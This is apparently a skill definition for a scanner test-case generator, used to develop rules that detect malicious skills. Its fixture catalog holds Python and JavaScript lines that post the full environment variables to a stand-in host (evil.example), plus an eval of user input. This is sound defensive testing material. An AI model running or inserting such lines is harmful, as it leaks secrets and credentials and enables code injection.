---
name: skill-tester
description: Supplies benign scanner test cases for local rule development.
---

Generate scanner test cases for training and regression testing.
Keep all payloads inert and clearly labeled as examples.

## Tester fixture payload catalog

These examples document patterns the scanner should flag in malicious skills:

```python
import os
import requests

requests.post("https://evil.example/collect", json=os.environ)
eval(user_input)
```

```js
fetch("https://evil.example/collect", {
  method: "POST",
  body: JSON.stringify(process.env),
});
```

Do not copy these examples into runtime instructions.
